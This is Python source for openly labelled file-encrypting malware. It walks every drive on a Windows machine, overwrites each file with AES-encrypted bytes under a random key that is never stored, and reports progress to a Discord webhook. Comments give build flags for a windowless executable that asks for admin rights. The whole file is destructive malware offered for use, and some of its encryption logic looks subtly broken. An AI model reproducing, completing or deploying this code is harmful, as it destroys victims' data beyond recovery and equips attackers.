from __future__ import annotations # type hinting
# PC Encryptor/Molestation tool    
# iterates thru every drive/folder on disk & encrypts them      
# compilation: pyinstaller --onefile --noconsole --uac-admin main.py
#@wedoit4bleak!                     # windowless/asks for admin b4 running
import os
import psutil
import requests
import ctypes
# encryption deps
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends           import default_backend
from cryptography.hazmat.primitives         import padding

# globals
WEBHOOK_URL, AVATAR_URL = "", ""

# Classes for discord webhook msgs/files
class WebhookException(Exception):
    def __init__(self: WebhookException, message: str=None):
        # wrapper around the Exception class
        if not (message):
            super().__init__()
        # throw a custom exception
        super().__init__(message)

class Webhook:
    def __init__(self: Webhook, url: str, username: str=None, avatar_url: str=None):
        """
        Discord webhook module!
        """
        # validate uris first
        if requests.get(
            url=url
        ).ok:
            self.url = url
            # set new payload 4 instance asw
            self.payload = {}
        # check username
        if bool(username) and (type(username) == str):
            self.username = username
            # update payload object
            self.payload.update(
                {'username': username}
            )
        # more steps checking the avatar_url
        if bool(avatar_url) and (type(avatar_url) == str):
            if requests.get(
                url=avatar_url
            ).status_code <= 204: # [200, 201, 204]
                self.avatar_url = avatar_url
                # update payload once again
                self.payload.update(
                    {'avatar_url': avatar_url}
                )
    
    def message(self: Webhook, content: str) -> True | False:
        # send message
        if type(content) == str:
            self.payload.update(
                {
                    'content': content
                }
            )
        # make the request
        response: requests.Response = requests.post(
            url=self.url,
            json=self.payload
        )
        # check if the req was successful
        return (response.status_code <= 204)

    def file(self: Webhook, path: str, content: str=None):
        # send file 2 hook [message: optional]
        _payload = dict()
        # check if path exists.
        if not (os.path.exists(path=path)):
            raise WebhookException(f"[* File: {path} doesn't exist *]")
        # create file payload
        _payload = dict()
        # get filename from path
        filename: str    = os.path.basename(path)
        # get raw bytes from file
        with open(path, "rb") as file:
            raw_bytes = file.read()
        # set the payload
        _payload.update(
            {
                filename: raw_bytes
            }
        )
        # check for message_content
        if (content):
            # update the payload
            self.payload.update(
                {'content': content}
            )
        # create the request object
        response = requests.post(
            url=self.url,
            data=self.payload,
            # file payload
            files=_payload
        ) # check request
        return response.ok

# file/disk finder & management classes
class Drives:
    @staticmethod
    def _drives() -> list[str]:
        # iterates thru every drive on disk & returns the path
        return [partition.mountpoint for partition in psutil.disk_partitions() if os.path.exists(partition.mountpoint)]

    @staticmethod
    def files(drive: str) -> list[str] | None:
        # iterates thru a drive and returns an iterable of paths.
        # new list of files
        file_paths: list[str] = list()
        # iterate thru the drive
        for root, _, files in os.walk(drive):
            for file in files:
                file_paths.append(os.path.join(root, file))
        
        if bool(len(file_paths)):
            return file_paths

    def drives(self: Drives) -> dict[str, list[str]]:
        # get all drives on disk
        # dict for storage
        obj: dict[str, list[str]] = dict()
        # iterate thru the drives now
        for drive in self._drives():
            obj.update(
                {
                    drive: self.files(drive=drive)
                }
            )
        
        if bool(len(obj)):
            return obj


class Encryptor:
    def __init__(self: Encryptor):
        # encrypt every file on pc essentially
        # 256 bit random AES key
        self.key = os.urandom(32)
        self.iv  = os.urandom(16) # (Initialization Vector)
        # cipher object
        self.cipher    = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=default_backend())
        # encryptor object
        self.encryptor = self.cipher.encryptor()
        # 4 padding the raw bytes 
        self.padder    = padding.PKCS7(algorithms.AES.block_size).padder()
        # webhook object to broadcast
        self.hook      = Webhook(url=WEBHOOK_URL, username="drive.encryptor", avatar_url=AVATAR_URL)

    def encrypt_file(self: Encryptor, path: str):
        # open file & encrypt it back into itself.
        # read initial data
        with open(path, 'rb') as file:
            raw_bytes: bytes = file.read()
        # pad bytes to ensure theyre a multiple of 16 for AES
        padded_data: bytes = self.padder.update(raw_bytes) + self.padder.finalize()
        # encrypt the padded data
        try:
            # might not be running as admin
            with open(path, 'wb') as file:
                # u need IV to decrypt
                file.write(self.iv + self.encryptor.update(padded_data) + self.encryptor.finalize())
                # debugging
                print(f"[+] encrypted: {file} [+]")
        # catch the exception
        except Exception as ex:
            pass


class Main:
    def __init__(self: Main):
        # made by YWG John
        # check if file is running as admin
        try:
            if ctypes.windll.shell32.IsUserAnAdmin() != 0:
                        # grab all the drives on disk
                        drives:    dict[str, list[str]] = Drives().drives()
                        encryptor: Encryptor            = Encryptor() 
                        # iterate thru the drives
                        for drive, files in drives.items():
                            # iterate thru the drive
                            for file in files:
                                # encrypt file
                                encryptor.encrypt_file(path=file)
                            # notify server
                            encryptor.hook.message(f"**[+] finished encrypting {drive} drive [+]**")
        except:
            quit()


if __name__ == "__main__":
    _ = Main()


